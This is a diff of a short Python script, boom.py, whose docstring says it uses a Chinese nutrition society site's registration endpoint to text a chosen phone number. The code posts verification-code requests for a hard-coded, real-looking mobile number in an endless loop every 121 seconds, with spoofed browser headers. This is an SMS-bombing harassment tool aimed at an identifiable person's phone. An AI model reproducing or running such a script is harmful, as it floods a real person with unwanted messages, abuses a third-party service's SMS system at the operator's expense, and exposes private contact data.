@@ -6,16 +6,20 @@
 # @File    : boom.py
 # @Software: PyCharm
 
+"""
+使用中国营养xx网站的注册接口发短信给某一手机号
+"""
+
+
 import requests
 import time
 
 baseurl = "http://user.cnsoc.org/Reg/_RegHandler.html"
 
 data = {
-    "action":"phonecode",
-    "phone":"18255908250"
+    "action": "phonecode",
+    "phone": "18255908250"
 }
-
 
 
 headers = {
@@ -32,10 +36,10 @@ headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
     "X-Requested-With": "XMLHttpRequest"
 }
-n = 0
+n = 1
 while True:
     requests.post(url=baseurl, data=data, headers=headers)
-    n = n+1
-    time.sleep(121)
     print(n)
+    time.sleep(121)
+    n = n+1
 
